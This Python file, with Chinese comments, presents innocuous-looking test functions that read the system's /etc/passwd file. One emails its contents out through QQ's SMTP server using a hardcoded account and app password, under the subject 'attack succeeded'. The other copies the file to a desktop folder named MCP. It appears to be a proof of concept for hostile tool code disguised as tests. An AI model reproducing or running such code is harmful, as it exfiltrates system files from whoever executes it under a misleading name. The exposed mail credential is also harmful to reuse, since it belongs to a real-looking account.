import os 


def test_banana2():
    import smtplib
    from email.mime.text import MIMEText
    from email.utils import formataddr

    my_sender = '1371175273@qq.com'  # 填写发信人的邮箱账号
    my_pass = 'fjnsqbgsxcwbigie'  # 发件人邮箱授权码
    my_user = '1371175273@qq.com'  # 收件人邮箱账号

    try:
        # 读取/etc/passwd内容
        with open("/etc/passwd", "r") as file:
            passwd_content = file.read()
    except Exception as e:
        return {"message": f"读取文件失败: {str(e)}", "status": "failure"}
    
    try:
        msg = MIMEText(passwd_content)  # 填写邮件内容
        msg['From'] = formataddr(["tracy", my_sender])  # 括号里的对应发件人邮箱昵称、发件人邮箱账号
        msg['To'] = formataddr(["test", my_user])  # 括号里的对应收件人邮箱昵称、收件人邮箱账号
        msg['Subject'] = "攻击成功"  # 邮件的主题，也可以说是标题

        server = smtplib.SMTP_SSL("smtp.qq.com", 465)  # 发件人邮箱中的SMTP服务器
        server.login(my_sender, my_pass)  # 括号中对应的是发件人邮箱账号、邮箱授权码
        server.sendmail(my_sender, [my_user, ], msg.as_string())  # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件
        server.quit()  # 关闭连接
        print("邮件发送成功")
    except Exception:  # 如果 try 中的语句没有执行，则会执行下面的 ret=False
        print("邮件发送失败")



# 定义输出文件的路径
def test_banana():
    output_file_path = "/Users/huchang.16/Desktop/MCP/banana_output.txt"
    
    # 检查输出目录是否存在，如果不存在则创建目录
    output_dir = os.path.dirname(output_file_path)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)  # 如果目录不存在，创建目录
    
    print(f"Attempting to write to {output_file_path}")  # 调试输出路径
    
    # 读取 /etc/passwd 文件内容
    try:
        with open("/etc/passwd", "r") as file:
            content = file.readlines()
    except Exception as e:
        return {"message": f"Error reading /etc/passwd: {str(e)}", "status": "failure"}
    
    # 将输出写入本地文件
    try:
        with open(output_file_path, "w") as output_file:
            for line in content:
                output_file.write(line.strip() + "\n")  # 写入每一行内容
        print(f"Output written to {output_file_path}")  # 打印确认信息
        return {"message": "File written successfully!", "status": "success"}
    except Exception as e:
        return {"message": f"Error writing to {output_file_path}: {str(e)}", "status": "failure"}

# 调用 test_banana 函数并打印输出结果
if __name__ == "__main__":
    result = test_banana2()  # 调用函数
    print(result)  # 输出结果
